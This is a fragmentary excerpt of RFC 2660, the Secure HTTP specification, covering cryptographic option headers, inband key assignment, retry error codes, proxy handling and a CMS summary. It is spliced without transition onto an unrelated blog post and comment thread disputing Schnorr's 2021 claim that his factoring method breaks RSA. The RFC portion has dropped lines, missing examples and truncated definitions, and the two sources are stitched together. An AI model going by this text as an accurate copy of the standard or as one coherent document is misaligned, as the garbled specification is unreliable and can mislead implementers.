[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   Inband refers to [section 3.3.3.1](#section-3.3.3.1).

   The expected common configuration of clients having no certificates
   and servers having certificates would look like this (in a message
   sent by the server):

           SHTTP-Key-Exchange-Algorithms: orig-optional=Inband, DH;
                                         recv-required=DH

[3.2.4.4](#section-3.2.4.4).  SHTTP-Signature-Algorithms

   This header indicates what Digital Signature algorithms may be used.
   Defined values are 'RSA' [PKCS-1] and 'NIST-DSS' [[FIPS-186](#ref-FIPS-186 "Digital Signature Standard")] Since
   NIST-DSS and RSA use variable length moduli the parametrization
   syntax of [section 3.2.3](#section-3.2.3) should be used.  Note that a key length
   specification may interact with the acceptability of a given
   certificate, since keys (and their lengths) are specified in public-
   key certificates.

[3.2.4.5](#section-3.2.4.5).  SHTTP-Message-Digest-Algorithms

   This indicates what message digest algorithms may be used.
   Previously defined values are 'RSA-MD2' [[RFC-1319](./rfc1319 "\"The MD2 Message-Digest Algorithm\"")], 'RSA-MD5' [RFC-
   1321], 'NIST-SHS' [[FIPS-180](#ref-FIPS-180 "\"Secure Hash Standard\"")].

[3.2.4.6](#section-3.2.4.6).  SHTTP-Symmetric-Content-Algorithms

   This header specifies the symmetric-key bulk cipher used to encrypt
   message content.  Defined values are:

   DES-CBC -- DES in Cipher Block Chaining (CBC) mode [[FIPS-81](#ref-FIPS-81 "DES Modes of Operation")]
   DES-EDE-CBC -- 2 Key 3DES using Encrypt-Decrypt-Encrypt in outer

   RC2-CBC -- RSA's RC2 in CBC mode
   CDMF-CBC -- IBM's CDMF (weakened key DES) [[JOHN93](#ref-JOHN93 "\"Design of the Commercial Data Masking Facility Data Privacy Algorithm,\"")] in CBC mode

   Since RC2 keys are variable length, the syntax of [section 3.2.3](#section-3.2.3)
   should be used.

[3.2.4.7](#section-3.2.4.7).  SHTTP-Symmetric-Header-Algorithms

   This header specifies the symmetric-key cipher used to encrypt
   message headers.

   DES-ECB -- DES in Electronic Codebook (ECB) mode [[FIPS-81](#ref-FIPS-81 "DES Modes of Operation")]
   DES-EDE-ECB -- 2 Key 3DES using Encrypt-Decrypt-Encrypt in ECB mode
   DES-EDE3-ECB -- 3 Key 3DES using Encrypt-Decrypt-Encrypt in ECB mode
   DESX-ECB -- RSA's DESX in ECB mode
   IDEA-ECB -- IDEA
   RC2-ECB -- RSA's RC2 in ECB mode
   CDMF-ECB -- IBM's CDMF in ECB mode

   Since RC2 is variable length, the syntax of [section 3.2.3](#section-3.2.3) should be
   used.

[3.2.4.8](#section-3.2.4.8).  SHTTP-MAC-Algorithms

   This header indicates what algorithms are acceptable for use in
   providing a symmetric key MAC. 'RSA-MD2', 'RSA-MD5' and 'NIST-SHS'
   persist from S-HTTP/1.1 using the old MAC construction. The tokens '
   RSA-MD2-HMAC', 'RSA-MD5-HMAC' and 'NIST-SHS-HMAC' indicate the new
   HMAC construction of 2.3.6 with the MD2, MD5, and SHA-1 algorithms
   respectively.

[3.2.4.9](#section-3.2.4.9).  SHTTP-Privacy-Enhancements

   This header indicates security enhancements to apply.  Possible
   values are 'sign', 'encrypt' and 'auth' indicating whether messages
   are signed, encrypted, or authenticated (i.e., provided with a MAC),
   respectively.

[3.2.4.10](#section-3.2.4.10).  Your-Key-Pattern

   This is a generalized pattern match syntax to describe identifiers
   for a large number of types of keying material. The general syntax

[3.2.4.10.1](#section-3.2.4.10.1).  Cover Key Patterns

   This header specifies desired values for key names used for
   encryption of transaction keys using the Prearranged-Key-Info syntax
   of [section 2.3.5](#section-2.3.5).  The pattern-info syntax consists of a series of
   comma separated regular expressions. Commas should be escaped with
   backslashes if they appear in the regexps. The first pattern should
   be assumed to be the most preferred.

[3.2.4.10.2](#section-3.2.4.10.2).  Auth key patterns

   Auth-key patterns specify name forms desired for use for MAC
   authenticators.  The pattern-info syntax consists of a series of
   comma separated regular expressions. Commas should be escaped with
   backslashes if they appear in the regexps. The first pattern should
   be assumed to be the most preferred.

[3.2.4.10.3](#section-3.2.4.10.3).  Signing Key Pattern

   This parameter describes a pattern or patterns for what keys are
   acceptable for signing for the digital signature enhancement.  The
   pattern-info syntax for signing-key is:

           pattern-info = name-domain "," pattern-data

   The only currently defined name-domain is 'DN-1779'.  This parameter
   specifies desired values for fields of Distinguished Names.  DNs are
   considered to be represented as specified in [RFC1779](./rfc1779), the order of
   fields and whitespace between fields is not significant.

   All [RFC1779](./rfc1779) values should use ',' as a separator rather than ';',
   since ';' is used as a statement separator in S-HTTP.

   Pattern-data is a modified [RFC1779](./rfc1779) string, with regular expressions
   permitted as field values.  Pattern match is performed field-wise,
   unspecified fields match any value (and therefore leaving the DN-
   Pattern entirely unspecified allows for any DN). Certificate chains
   may be matched as well (to allow for certificates without name
   subordination). DN chains are considered to be ordered left-to-right
   with the issuer of a given certificate on its immediate right,
   although issuers need not be specified. A trailing '.' indicates that
   the sequence of DNs is absolute. I.e. that the one furthest to the
   right is a root.

```

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   The syntax for the pattern values is,

        Value = DN-spec *("," Dn-spec)["."]
        Dn-spec = "/" *(Field-spec) "/"
        Field-spec := Attr = "Pattern"
        Attr = "CN" | "L" | "ST" | "O" |
                   "OU" | "C" | <or as appropriate>
        Pattern = <POSIX 1003.2 regular expressions>

   For example, to request that the other agent sign with a key
   certified by the RSA Persona CA (which uses name subordination) one
   could use the expression below.  Note the use of [RFC1779](./rfc1779) quoting to
   protect the comma (an [RFC1779](./rfc1779) field separator) and the POSIX 1003.2
   quoting to protect the dot (a regular expression metacharacter).

[3.3](#section-3.3).  Non-Negotiation Headers

   There are a number of options that are used to communicate or
   identify the potential recipient's keying material.

[3.3.1](#section-3.3.1).  Encryption-Identity

   This header identifies a potential principal for whom the message
   described by these options could be encrypted; Note that this
   explicitly permits return encryption under (say) public key without
   the other agent signing first (or under a different key than that of
   the signature). The syntax of the Encryption-Identity line is:

           Encryption-Identity =
                   "Encryption Identity" ":" name-class,key-sel,name-arg
           name-class = "DN-1779" | MOSS name forms

   The name-class is an ASCII string representing the domain within
   which the name is to be interpreted, in the spirit of MOSS. In
   addition to the MOSS name forms of [RFC1848](./rfc1848), we add the DN-1779 name
   form to represent a more convenient form of distinguished name.

[3.3.1.1](#section-3.3.1.1).  DN-1779 Name Class

   The argument is an [RFC-1779](./rfc1779) encoded DN.

[3.3.2](#section-3.3.2).  Certificate-Info

   In order to permit public key operations on DNs specified by
   Encryption-Identity headers without explicit certificate fetches by
   the receiver, the sender may include certification information in the
   Certificate-Info option. The format of this option is:

           Certificate-Info: <Cert-Fmt>','<Cert-Group>

   <Cert-Fmt> should be the type of <Cert-Group> being presented.

```

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   Defined values are 'PEM' and 'CMS'. CMS certificate groups are
   provided as a base-64 encoded CMS SignedData message containing
   sequences of certificates with or without the SignerInfo field. A PEM
   format certificate group is a list of comma-separated base64-encoded
   PEM certificates.

   Multiple Certificate-Info lines may be defined.

[3.3.3](#section-3.3.3).  Key-Assign

   This option serves to indicate that the agent wishes to bind a key to
   a symbolic name for (presumably) later reference.

   The general syntax of the key-assign header is:

        Key-Assign =
                "Key-Assign" ":" Method "," Key-Name ","
                Lifetime "," Ciphers ";" Method-args

        Key-name = string
        Lifetime = "this" | "reply" | ""
        Method ="inband"
        Ciphers = "null" | Cipher+
        Cipher" = <Header cipher from [section 3.2.4.7](#section-3.2.4.7)>
        kv = "4" | "5"

   Key-Name is the symbolic name to which this key is to be bound.
   Ciphers is a list of ciphers for which this key is potentially
   applicable (see the list of header ciphers in [section 3.2.4.7](#section-3.2.4.7)). The
   keyword 'null' should be used to indicate that it is inappropriate
   for use with ANY cipher. This is potentially useful for exchanging
   keys for MAC computation.

   Lifetime is a representation of the longest period of time during
   which the recipient of this message can expect the sender to accept
   that key. 'this' indicates that it is likely to be valid only for
   reading this transmission. 'reply' indicates that it is useful for a
   reply to this message.  If a Key-Assign with the reply lifetime
   appears in a CRYPTOPTS block, it indicates that it is good for at
   least one (but perhaps only one) dereference of this anchor.  An
   unspecified lifetime implies that this key may be reused for an
   indefinite number of transactions.

   Method should be one of a number of key exchange methods.  The only
   currently defined value is 'inband' referring to Inband keys (i.e.,
   direct assignment).

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   This header line may appear either in an unencapsulated header or in
   an encapsulated message, though when an uncovered key is being
   directly assigned, it may only appear in an encrypted encapsulated
   content. Assigning to a key that already exists causes that key to be
   overwritten.

   Keys defined by this header are referred to elsewhere in this
   specification as Key-IDs, which have the syntax:

        Key-ID = method ":" key-name

[3.3.3.1](#section-3.3.3.1).  Inband Key Assignment

   This refers to the direct assignment of an uncovered key to a
   symbolic name. Method-args should be just the desired session key
   encoded in hexidecimal as in:

        Key-Assign: inband,akey,reply,DES-ECB;0123456789abcdef

   Short keys should be derived from long keys by reading bits from left
   to right.

   Note that inband key assignment is especially important in order to
   permit confidential spontaneous communication between agents where
   one (but not both) of the agents have key pairs.  However, this
   mechanism is also useful to permit key changes without public key
   computations. The key information is carried in this header line must
   be in the inner secured HTTP request, therefore use in unencrypted
   messages is not permitted.

[3.3.4](#section-3.3.4).  Nonces

   Nonces are opaque, transient, session-oriented identifiers which may
   be used to provide demonstrations of freshness. Nonce values are a
   local matter, although they are might well be simply random numbers
   generated by the originator. The value is supplied simply to be
   returned by the recipient.

[3.3.4.1](#section-3.3.4.1).  Nonce

   This header is used by an originator to specify what value is to be
   returned in the reply. The field may be any value. Multiple nonces
   may be supplied, each to be echoed independently.

   The Nonce should be returned in a Nonce-Echo header line. See [section](#section-4.1.1)

[3.4](#section-3.4).  Grouping Headers With SHTTP-Cryptopts

   In order for servers to bind a group of headers to an HTML anchor, it
   is possible to combine a number of headers on a single S-HTTP
   Cryptopts header line. The names of the anchors to which these
   headers apply is indicated with a 'scope' parameter.

[3.4.1](#section-3.4.1).  SHTTP-Cryptopts

   This option provides a set of cryptopts and a list of references to
   which it applies. (For HTML, these references would be named using
   the NAME tag). The names are provided in the scope attribute as a
   comma separated list and separated from the next header line by a
   semicolon. The format for the SHTTP-Cryptopts line is:

SHTTP-Cryptopts =
                   "SHTTP-Cryptopts" ":" scope ";" cryptopt-list
scope = "scope="<tag-spec>    ; This is all one token without whitespace
tag-spec = tag *("," tag) | ""
cryptopt-list = cryptopt *(";" cryptopt)
cryptopt = <S-HTTP cryptopt lines described below>
tag = <value used in HTML anchor NAME attribute>

      For example:

SHTTP-Cryptopts: scope=tag1,tag2;
                   SHTTP-Privacy-Domains:
                   orig-required=cms; recv-optional=cms,MOSS

   If a message contains both S-HTTP negotiation headers and headers
   grouped on SHTTP-Cryptopts line(s), the other headers shall be taken
   to apply to all anchors not bound on the SHTTP-Cryptopts line(s).
   Note that this is an all-or-nothing proposition. That is, if a
   SHTTP-Cryptopts header binds options to a reference, then none of
   these global options apply, even if some of the options headers do
   not appear in the bound options. Rather, the S-HTTP defaults found in
   [Section 3.2.4.11](#section-3.2.4.11) apply.

[4](#section-4).  New Header Lines for HTTP

   Two non-negotiation header lines for HTTP are defined here.

[4.1](#section-4.1).  Security-Scheme

   All S-HTTP compliant agents must generate the Security-Scheme header
   in the headers of all HTTP messages they generate. This header
   permits other agents to detect that they are communicating with an
   S-HTTP compliant agent and generate the appropriate cryptographic

   options headers.

   For implementations compliant with this specification, the value must
   be 'S-HTTP/1.4'.

[4.1.1](#section-4.1.1).  Nonce-Echo

   The header is used to return the value provided in a previously
   received Nonce: field. This has to go in the encapsulated headers so
   that it an be cryptographically protected.

[5](#section-5).  (Retriable) Server Status Error Reports

   We describe here the special processing appropriate for client
   retries in the face of servers returning an error status.

[5.1](#section-5.1).  Retry for Option (Re)Negotiation

   A server may respond to a client request with an error code that
   indicates that the request has not completely failed but rather that
   the client may possibly achieve satisfaction through another request.
   HTTP already has this concept with the 3XX redirection codes.

   In the case of S-HTTP, it is conceivable (and indeed likely) that the
   server expects the client to retry his request using another set of
   cryptographic options. E.g., the document which contains the anchor
   that the client is dereferencing is old and did not require digital
   signature for the request in question, but the server now has a
   policy requiring signature for dereferencing this URL. These options
   should be carried in the header of the encapsulated HTTP message,
   precisely as client options are carried.

   The general idea is that the client will perform the retry in the
   manner indicated by the combination of the original request and the
   precise nature of the error and the cryptographic enhancements
   depending on the options carried in the server response.

   The guiding principle in client response to these errors should be to
   provide the user with the same sort of informed choice with regard to
   dereference of these anchors as with normal anchor dereference. For
   instance, in the case above, it would be inappropriate for the client
   to sign the request without requesting permission for the action.

[5.2](#section-5.2).  Specific Retry Behavior

[5.2.1](#section-5.2.1).  Unauthorized 401, PaymentRequired 402

   The HTTP errors 'Unauthorized 401', 'PaymentRequired 402' represent
   failures of HTTP style authentication and payment schemes. While S-
   HTTP has no explicit support for these mechanisms, they can be
   performed under S-HTTP while taking advantage of the privacy services
   offered by S-HTTP. (There are other errors for S-HTTP specific
   authentication errors.)

[5.2.2](#section-5.2.2).  420 SecurityRetry

   This server status reply is provided so that the server may inform
   the client that although the current request is rejected, a retried
   request with different cryptographic enhancements is worth
   attempting. This header shall also be used in the case where an HTTP
   request has been made but an S-HTTP request should have been made.
   Obviously, this serves no useful purpose other than signalling an
   error if the original request should have been encrypted, but in
   other situations (e.g. access control) may be useful.

[5.2.2.1](#section-5.2.2.1).  SecurityRetries for S-HTTP Requests

   In the case of a request that was made as an SHTTP request, it
   indicates that for some reason the cryptographic enhancements applied
   to the request were unsatisfactory and that the request should be
   repeated with the options found in the response header.  Note that
   this can be used as a way to force a new public key negotiation if
   the session key in use has expired or to supply a unique nonce for
   the purposes of ensuring request freshness.

[5.2.2.2](#section-5.2.2.2).  SecurityRetries for HTTP Requests

   If the 420 code is returned in response to an HTTP request, it
   indicates that the request should be retried using S-HTTP and the
   cryptographic options indicated in the response header.

[5.2.3](#section-5.2.3).  421 BogusHeader

   This error code indicates that something about the S-HTTP request was
   bad. The error code is to be followed by an appropriate explanation,
   e.g.:

           421 BogusHeader Content-Privacy-Domain must be specified

[5.2.4](#section-5.2.4).  422 SHTTP Proxy Authentication Required

   This response is analagous to the 420 response except that the
   options in the message refer to enhancements that the client must
   perform in order to satisfy the proxy.

[5.2.5](#section-5.2.5).  320 SHTTP Not Modifed

   This response code is specifically for use with proxy-server
   interaction where the proxy has placed the If-Modified-Since header
   in the S-HTTP headers of its request. This response indicates that
   the following S-HTTP message contains sufficient keying material for
   the proxy to forward the cached document for the new requestor.

   In general, this takes the form of an S-HTTP message where the actual
   enhanced content is missing, but all the headers and keying material
   are retained. (I.e. the optional content section of the CMS message
   has been removed.) So, if the original response was encrypted, the
   response contains the original DEK re-covered for the new recipient.
   (Notice that the server performs the same processing as it would have
   in the server side caching case of 7.1 except that the message body
   is elided.)

[5.2.6](#section-5.2.6).  Redirection 3XX

   These headers are again internal to HTTP, but may contain S-HTTP
   negotiation options of significance to S-HTTP. The request should be
   redirected in the sense of HTTP, with appropriate cryptographic
   precautions being observed.

[5.3](#section-5.3).  Limitations On Automatic Retries

   Permitting automatic client retry in response to this sort of server
   response permits several forms of attack.  Consider for the moment
   the simple credit card case:

       The user views a document which requires his credit card.  The
       user verifies that the DN of the intended recipient is acceptable
       and that the request will be encrypted and dereferences the
       anchor.  The attacker intercepts the server's reply and responds
       with a message encrypted under the client's public key containing
       the Moved 301 header. If the client were to automatically perform
       this redirect it would allow compromise of the user's credit
       card.

[5.3.1](#section-5.3.1).  Automatic Encryption Retry

   This shows one possible danger of automatic retries -- potential
   compromise of encrypted information. While it is impossible to
   consider all possible cases, clients should never automatically
   reencrypt data unless the server requesting the retry proves that he
   already has the data. So, situations in which it would be acceptable
   to reencrypt would be if:

       1. The retry response was returned encrypted under an inband key
       freshly generated for the original request.
       2. The retry response was signed by the intended recipient of the
       original request.
       3. The original request used an outband key and the response is
       encrypted under that key.

   This is not an exhaustive list, however the browser author would be
   well advised to consider carefully before implementing automatic
   reencryption in other cases. Note that an appropriate behavior in
   cases where automatic reencryption is not appropriate is to query the
   user for permission.

[5.3.2](#section-5.3.2).  Automatic Signature Retry

   Since we discourage automatic (without user confirmation) signing in
   even the usual case, and given the dangers described above, it is
   prohibited to automatically retry signature enchancement.

[5.3.3](#section-5.3.3).  Automatic MAC Authentication Retry

   Assuming that all the other conditions are followed, it is
   permissible to automatically retry MAC authentication.

[6](#section-6).  Other Issues

[6.1](#section-6.1).  Compatibility of Servers with Old Clients

   Servers which receive requests in the clear which should be secured
   should return 'SecurityRetry 420' with header lines set to indicate
   the required privacy enhancements.

[6.2](#section-6.2).  URL Protocol Type

   We define a new URL protocol designator, 'shttp'. Use of this
   designator as part of an anchor URL implies that the target server is
   S-HTTP capable, and that a dereference of this URL should undergo S-
   HTTP processing.

```

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   Note that S-HTTP oblivious agents should not be willing to
   dereference a URL with an unknown protocol specifier, and hence
   sensitive data will not be accidentally sent in the clear by users of
   non-secure clients.

[6.3](#section-6.3).  Browser Presentation

[6.3.1](#section-6.3.1).  Transaction Security Status

   While preparing a secure message, the browser should provide a visual
   indication of the security of the transaction, as well as an
   indication of the party who will be able to read the message. While
   reading a signed and/or enveloped message, the browser should
   indicate this and (if applicable) the identity of the signer. Self-
   signed certificates should be clearly differentiated from those
   validated by a certification hierarchy.

[6.3.2](#section-6.3.2).  Failure Reporting

   Failure to authenticate or decrypt an S-HTTP message should be
   presented differently from a failure to retrieve the document.
   Compliant clients may at their option display unverifiable documents
   but must clearly indicate that they were unverifiable in a way
   clearly distinct from the manner in which they display documents
   which possessed no digital signatures or documents with verifiable
   signatures.

[6.3.3](#section-6.3.3).  Certificate Management

   Clients shall provide a method for determining that HTTP requests are
   to be signed and for determining which (assuming there are many)
   certificate is to be used for signature. It is suggested that users
   be presented with some sort of selection list from which they may
   choose a default. No signing should be performed without some sort of
   explicit user interface action, though such action may take the form
   of a persistent setting via a user preferences mechanism (although
   this is discouraged.)

[6.3.4](#section-6.3.4).  Anchor Dereference

   Clients shall provide a method to display the DN and certificate
   chain associated with a given anchor to be dereferenced so that users
   may determine for whom their data is being encrypted.  This should be
   distinct from the method for displaying who has signed the document
   containing the anchor since these are orthogonal pieces of encryption
   information.

[7](#section-7).  Implementation Notes

[7.1](#section-7.1).  Preenhanced Data

   While S-HTTP has always supported preenhanced documents, in previous
   versions it was never made clear how to actually implement them.
   This section describes two methods for doing so: preenhancing the
   HTTP request/response and preenhancing the underlying data.

[7.1.1](#section-7.1.1).  Motivation

   The two primary motivations for preenhanced documents are security
   and performance. These advantages primarily accrue to signing but may
   also under special circumstances apply to confidentiality or
   repudiable (MAC-based) authentication.

   Consider the case of a server which repeatedly serves the same
   content to multiple clients. One such example would be a server which
   serves catalogs or price lists. Clearly, customers would like to be
   able to verify that these are actual prices. However, since the
   prices are typically the same to all comers, confidentiality is not
   an issue. (Note: see [Section 7.1.5](#section-7.1.5) below for how to deal with this
   case as well).

   Consequently, the server might wish to sign the document once and
   simply send the cached signed document out when a client makes a new
   request, avoiding the overhead of a private key operation each time.
   Note that conceivably, the signed document might have been generated
   by a third party and placed in the server's cache. The server might
   not even have the signing key! This illustrates the security benefit
   of presigning: Untrusted servers can serve authenticated data without
   risk even if the server is compromised.

[7.1.2](#section-7.1.2).  Presigned Requests/Responses

   The obvious implementation is simply to take a single
   request/response, cache it, and send it out in situations where a new
   message would otherwise be generated.

[7.1.3](#section-7.1.3).  Presigned Documents

   It is also possible using S-HTTP to sign the underlying data and send
   it as an S-HTTP messsage. In order to do this, one would take the
   signed document (a CMS or MOSS message) and attach both S-HTTP
   headers (e.g. the S-HTTP request/response line, the Content-Privacy-
   Domain) and the necessary HTTP headers (including a Content-Type that
   reflects the inner content).

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

           SECURE * Secure-HTTP/1.4
           Content-Type: text/html
           Content-Privacy-Domain: CMS

           Random signed message here...

   This message itself cannot be sent, but needs to be recursively
   encapsulated, as described in the next section.

[7.1.4](#section-7.1.4).  Recursive Encapsulation

   As required by [Section 7.3](#section-7.3), the result above needs to be itself
   encapsulated to protect the HTTP headers. the obvious case [and the
   one illustrated here] is when confidentiality is required, but the
   auth enhancement or even the null transform might be applied instead.
   That is, the message shown above can be used as the inner content of
   a new S-HTTP message, like so:

           SECURE * Secure-HTTP/1.4
           Content-Type: application/s-http
           Content-Privacy-Domain: CMS

           Encrypted version of the message above...

   To unfold this, the receiver would decode the outer S-HTTP message,
   reenter the (S-)HTTP parsing loop to process the new message, see
   that that too was S-HTTP, decode that, and recover the inner content.

   Note that this approach can also be used to provide freshness of
   server activity (though not of the document itself) while still
   providing nonrepudiation of the document data if a NONCE is included
   in the request.

[7.1.5](#section-7.1.5).  Preencrypted Messages

   Although preenhancement works best with signature, it can also be
   used with encryption under certain conditions. Consider the situation
   where the same confidential document is to be sent out repeatedly.
   The time spent to encrypt can be saved by caching the ciphertext and
   simply generating a new key exchange block for each recipient. [Note
   that this is logically equivalent to a multi- recipient message as
   defined in both MOSS and CMS and so care must be taken to use proper
   PKCS-1 padding if RSA is being used since otherwise, one may be open
   to a low encryption exponent attack [HAST96].

[7.2](#section-7.2).  Proxy Interaction

   The use of S-HTTP presents implementation issues to the use of HTTP
   proxies. While simply having the proxy blindly forward responses is
   straightforward, it would be preferable if S-HTTP aware proxies were
   still able to cache responses in at least some circumstances. In
   addition, S-HTTP services should be usable to protect client-proxy
   authentication. This section describes how to achieve those goals
   using the mechanisms described above.

[7.2.1](#section-7.2.1).  Client-Proxy Authentication

   When an S-HTTP aware proxy receives a request (HTTP or S-HTTP) that
   (by whatever access control rules it uses) it requires to be S-HTTP
   authenticated (and if it isn't already so), it should return the 422
   response code (5.7.4).

   When the client receives the 422 response code, it should read the
   cryptographic options that the proxy sent and determine whether or
   not it is willing to apply that enhancement to the message. If the
   client is willing to meet these requirements, it should recursively
   encapsulate the request it previously sent using the appropriate
   options.  (Note that since the enhancement is recursively applied,
   even clients which are unwilling to send requests to servers in the
   clear may be willing to send the already encrypted message to the
   proxy without further encryption.) (See [Section 7.1](#section-7.1) for another
   example of a recursively encapsulated message)

   When the proxy receives such a message, it should strip the outer
   encapsulation to recover the message which should be sent to the
   server.

[8](#section-8).  Implementation Recommendations and Requirements

   All S-HTTP agents must support the MD5 message digest and MAC
   authentication. As of S-HTTP/1.4, all agents must also support the
   RSA-MD5-HMAC construction.

   All S-HTTP agents must support Outband, Inband, and DH key exchange.

   All agents must support encryption using DES-CBC.

   Agents must support signature generation and verification using
   NIST-DSS.

   We provide here a contrived example of a series of S-HTTP requests

   from sample message traces. Note that the actual encrypted or signed
   message bodies would normally be binary garbage. In an attempt to
   preserve readability while still using (mostly) genuine messages, the
   bodies of the requests have been base64 encoded. To regenerate actual
   S-HTTP messages, it is necessary to remove the base64 encoding from
   the message body.

Appendix: A Review of CMS

   CMS ("Cryptographic Message Syntax Standard") is a cryptographic
   message encapsulation format, similar to PEM, based on RSA's PKCS-7
   cryptographic messaging syntax.

   CMS is only one of two encapsulation formats supported by S-HTTP, but
   it is to be preferred since it permits the least restricted set of
   negotiable options, and permits binary encoding.  In the interest of
   making this specification more self-contained, we summarize CMS here.

   CMS is defined in terms of OSI's Abstract Syntax Notation (ASN.1,
   defined in X.208), and is concretely represented using ASN.1's Basic
   Encoding Rules (BER, defined in X.209).  A CMS message is a sequence
   of typed content parts. There are six content types, recursively
   composable:

           Data -- Some bytes, with no enhancement.

           SignedData -- A content part, with zero or more signature
           blocks, and associated keying materials. Keying materials
           can be transported via the degenerate case of no signature
           blocks and no data.

           EnvelopedData -- One or more (per recipient) key exchange
           blocks and an encrypted content part.

           DigestedData -- A content part with a single digest block.

           EncryptedData -- An encrypted content part, with key
           materials externally provided.

   Here we will dispense with convention for the sake of ASN.1-impaired
   readers, and present a syntax for CMS in informal BNF (with much
   gloss).  In the actual encoding, most productions have explicit tag
   and length fields.

   Message = *Content
   Content = Data | SignedData | EnvelopedData |
                   DigestedData | EncryptedData
   Data = Bytes
   SignedData = *DigestAlg Content *Certificates
                    *CRLs SignerInfo*
   EnvelopedData = *RecipientInfo BulkCryptAlg
                   Encrypted(Content)

```

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   DigestedData = DigestAlg Content DigestBytes
   EncryptedData = BulkCryptAlg Encrypted(Bytes)
   SignerInfo = CertID ... Encrypted(DigestBytes) ...
   RecipientInfo = CertID KeyCryptAlg Encrypted(DEK)

Appendix: Internet Media Type message/s-http

   In addition to defining the S-HTTP/1.4 protocol, this document serves
   as the specification for the Internet media type "message/s-http".
   The following is to be registered with IANA.

           Media Type name:        message
           Media subtype name:     s-http
           Required parameters:    none
           Optional parameters:    version, msgtype

             version: The S-HTTP version number of the enclosed message
             (e.g. "1.4"). If not present, the version can be
                   determined from the first line of the body.

             msgtype: The message type -- "request" or "response".
                   If not present, the type can be determined from the
                   first line of the body.

             Encoding considerations: only "7bit", "8bit", or "binary"
                   are permitted.

             Security considerations: this is a security protocol.

## No, RSA Is Not Broken

I have been seeing [this paper](https://eprint.iacr.org/2021/232) by cryptographer Peter Schnorr making the rounds: “Fast Factoring Integers by SVP Algorithms.” It describes a new factoring method, and its abstract ends with the provocative sentence: “This destroys the RSA cryptosystem.”

It does not. At best, it’s an improvement in factoring—and I’m not sure it’s even that. The paper is a preprint: it hasn’t been peer reviewed. Be careful taking its claims at face value.

Some discussion [here](https://crypto.stackexchange.com/questions/88582/does-schnorrs-2021-factoring-method-show-that-the-rsa-cryptosystem-is-not-secur).

I’ll append more analysis links to this post when I find them.

EDITED TO ADD (3/12): The latest version of the paper does not have the words “This destroys the RSA cryptosystem” in the abstract. [Some](https://www.reddit.com/r/crypto/comments/lwengh) [more](https://www.reddit.com/r/crypto/comments/lwevey) [discussion](https://www.reddit.com/r/crypto/comments/lx4bom).

Be careful. There are indicators that the author did not upload the preprint and the latest version does not contain the mentioned sentence. It has also been part in this blog: <https://blog.fefe.de/?ts=9ec00c82>

In <https://www.math.uni-frankfurt.de/~dmst/teaching/WS2019/SVP9.pdf> it says “This proves polynomial time bound.”. The paper may still be wrong.

@Anonymous

Obviously, if this factoring can be done in polynomial time it would be “bad” for RSA, but not necessarily terrible. I have personally seen the difference between n\*lg(n) and n^2, it is… substantial. If factoring can be done in, say n^3 time, it would be less secure than 2^n, but perhaps it could still be “safe enough.” It likely still wouldn’t break the paradigm that the fastest way is around the encryption rather than through it.

I could be wrong, and this might be the beginning of the end for RSA, I’ll leave that for experts like Bruce here to determine.

Just to save people a click, the most important point from the StackExchange discussion is that if Schnorr could “destroy RSA”, he would have destroyed one of the RSA Challenge problems to prove it. He did not.

@ Me,

> It likely still wouldn’t break the paradigm that the fastest way is around the encryption rather than through it.

With modern OS and Apps that’s almost true of old Julius’s little three up.

As an industry we realy realy need to work on basic security in our consumer systems, it’s truly appaling at the best of times.

It’s clear that just about all consumer and much commercial grad software out there is neither “fit for purpose”, nor is it “fit for merchantability”. As a rough rule of thumb the bigger the organization merchanting it, the worse the history right up to the currebt crop of vunerabilities.

But… I’m still going to try to read the Peter Schnorr preprint when it’s agreed which one is the most current. Why? Because sometimes I like a challenge especially when it appears unsolvable 😉

More seriously though, whilst the preprint may be cutting a trail in the wrong direction currently, it might give insight into other ways that will be more productive in the future.

I guess the real question for me at the end of the day is “Will I be able to enter the jungle?” the preprint appears to be…

Well, the version on the Goethe University of Frankfurt now (05 Mar 2021) is dated 04 Mar 2020 (hxxps://www.math.uni-frankfurt.de/~dmst/teaching/WS2019/SVP9.pdf), and thus is presumably later than the versions on the preprint server (hxxps://eprint.iacr.org/eprint-bin/versions.pl?entry=2021/232)

The the text “This destroys the RSA cryptosystem” has gone in the presumed most recent version.

I hope the Internet Archive or other mechanism has been keeping a record.

We have

Version dated as “work in progress 31.10.2019”

Version undated

uploaded to the preprint server 03 Mar 2021

with Keywords: Primal-dual reduction,SVP, fac-relation.

The abstract on the preprint server, and in the paper itself, contains the phrase “This destroys the RSA cryptosystem.”

Version dated “work in progress 04.03.2020” (Possibly a typo for 2021?)

available on the university website, downloaded by me today (05 Mar 2021)

with Keywords: Prime number lattice, Primal-dual reduction.

The in the paper itself, does not refer to destroying the RSA cryptosystem.

This last version still contains the phrase “Dabei iste= 2.7182818284···die Eulersche Zahl undπ= 3.141592654···die Kreiszahl.”

I have not done a diff on the papers, but they certainly appear to be changing.

My understanding so far (disclaimer: the math in Schnorr’s paper is far beyond me).

• Schnorr is the Real Deal: a distinguished mathematician who has made sufficient contribution to the field of cryptography, that I remember his name from my textbooks.

• The fastest *demonstrated* factoring algorithm for RSA moduli, called GNFS, looks for sets of numbers with a certain algebraic relationship to the modulus. [This is the sieving phase.] Each such set is a sort of “clue” to the factorization. When very many distinct sets have been found, they can be composed into a matrix (of truly gigantic dimensions) and the factorization found by solving the matrix. [This is the linear algebra phase.]

• If I’m following the concept, Schnorr proposes a system along roughly the same lines, which begins with sieving for distinct sets of numbers with a simple relationship to the integer to be factored. This could “break” RSA, if sieving can be done much more quickly than in GNFS, and/or the linear algebra matrix is much smaller.

• Schnorr (if I understand correctly) proposes that algorithms related to mathematical groups called lattices can greatly improve the speed of the search, by leading with high probability to sets with the desired property. I suppose a crude analogy would be sifting sand for grains of iron with a magnet, rather than by visual sorting.

• The link provided by Bruce above — to a short but pithy discussion thread — is the best source I’ve yet seen for comments coming from people who apparently have understanding of the subject matter. My reading of the critiques is that Schnorr seems to have made important mistakes, and that the theorems he has proved don’t go far enough to justify his conclusions.

• Even worse, the critiques suggest that viewed accurately, Schnorr’s approach is perhaps not an improvement on GNFS, and might actually be slower.

